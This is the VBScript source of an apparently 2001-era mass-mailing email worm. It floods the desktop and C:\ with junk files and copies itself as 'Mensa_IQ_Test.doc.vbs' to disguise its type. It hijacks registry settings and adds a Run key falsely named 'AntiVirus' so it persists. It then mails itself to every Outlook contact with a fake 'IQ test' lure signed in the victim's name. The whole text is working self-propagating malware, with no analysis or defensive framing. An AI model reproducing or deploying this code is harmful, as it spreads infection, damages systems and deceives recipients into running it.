'Author: 	Jens Jeremies
'Location:  Munich, Germany
'Date: 		August, 2001

On Error Resume Next
                    
    Const ForWriting = 2
     
    Set fso = CreateObject("Scripting.FileSystemObject")
     
    For index = 0 To 50 
	    File = "C:\Windows\Desktop\Jens_Jeremies" & index & ".doc"
	
	    Set ts = fso.OpenTextFile(File, ForWriting, True)
	   
	    ts.WriteLine "Everybody Loves Jens Jeremies!"
	    ts.Close    
	          
	    File = "C:\Windows\Desktop\Jens_Jeremies" & index & ".xls"
	
	    Set ts = fso.OpenTextFile(File, ForWriting, True)
	   
	    ts.WriteLine "Everybody Loves Jens Jeremies!"
	    ts.Close    
	   
	    File = "C:\Windows\Desktop\Jens_Jeremies" & index & ".ppt"
	
	    Set ts = fso.OpenTextFile(File, ForWriting, True)
	    ts.Close	             
	    
	    File = "C:\Windows\Desktop\Jens_Jeremies" & index & ".jpg"
	
	    Set ts = fso.OpenTextFile(File, ForWriting, True)
	    ts.Close	    
    Next

    For index = 0 To 50 
	    File = "C:\Jens_Jeremies" & index & ".doc"
	
	    Set ts = fso.OpenTextFile(File, ForWriting, True)
	   
	    ts.WriteLine "Everybody Loves Jens Jeremies!"
	    ts.Close    
	          
	    File = "C:\Jens_Jeremies" & index & ".xls"
	
	    Set ts = fso.OpenTextFile(File, ForWriting, True)
	   
	    ts.WriteLine "Everybody Loves Jens Jeremies!"
	    ts.Close    
	   
	    File = "C:\Jens_Jeremies" & index & ".ppt"
	
	    Set ts = fso.OpenTextFile(File, ForWriting, True)
	    ts.Close	             
	    
	    File = "C:\Jens_Jeremies" & index & ".jpg"
	
	    Set ts = fso.OpenTextFile(File, ForWriting, True)
	    ts.Close	    
    Next
                
                
 Set ts = Nothing


Set WS = CreateObject("WScript.Shell") 

Folder = FSO.GetSpecialFolder(1)
Set InF = FSO.OpenTextFile(WScript.ScriptFullname,1) 
   
Do While InF.AtEndOfStream <> True
	ScriptBuffer = ScriptBuffer & InF.ReadLine & vbcrlf
Loop 
Set OutF = FSO.OpenTextFile(Folder&"\Mensa_IQ_Test.doc.vbs",2,True)
OutF.Write ScriptBuffer
OutF.Close

Set FSO = Nothing
Dim TheName

Ws.RegWrite "HKCU\software\Microsoft\Internet Explorer\Main\Start Page", "http://www.soccerage.com/de/04/04594.html"
Ws.RegWrite "HKLM\software\Microsoft\Internet Explorer\Main\Start Page", "http://www.soccerage.com/de/04/04594.html"
Ws.RegWrite "HKLM\System\CurrentControlSet\Control\ComputerName\ComputerName", "Jens Jeremies' Computer"
TheName = ws.RegRead ("HKLM\software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
Ws.RegWrite "HKLM\software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Jens Jeremies"
Ws.RegWrite "HKLM\software\Microsoft\Windows\CurrentVersion\Run\AntiVirus", Folder & "\Mensa_IQ_Test.doc.vbs"

                                                                                      
WS.Run("http://www.soccerage.com/de/04/04594.html")
	
Dim x,a,ctrlists,ctrentries,mailad,b,regedit,regv,regad

Set out=WScript.CreateObject("Outlook.Application")
Set mapi=out.GetNameSpace("MAPI")       	      
	
For ctrlists=1 To mapi.AddressLists.Count    

		Set a=mapi.AddressLists(ctrlists)
	 
			For x=1 To a.AddressEntries.Count      					        
					
					mailad=a.AddressEntries(x)   
		            
					Set mail=out.CreateItem(0)   
					
					mail.Recipients.Add(mailad) 
					                                                                   
					mail.Subject = "Try this IQ test"   
				
					mail.Body = "Hey! " &vbcrlf & vbcrlf & "Check out this IQ test I found on the net. " & vbcrlf & vbcrlf & "I scored in the 98th percentile!" & vbcrlf & vbcrlf & "If you get more than 24 correct then you are a genius. See how you go." &vbcrlf & vbcrlf & "Regards,"  & vbcrlf & vbcrlf & TheName & vbcrlf & vbcrlf
				
					mail.Attachments.Add(folder & "\Mensa_IQ_Test.doc.vbs")
	   
					mail.send
			Next
	Next
	Set out=Nothing
	Set mapi=Nothing
      
    msgbox "You are very intelligent." & vbcrlf & "You scored in the 98th percentile!" & vbcrlf & "Jens Jeremies is proud of you." 
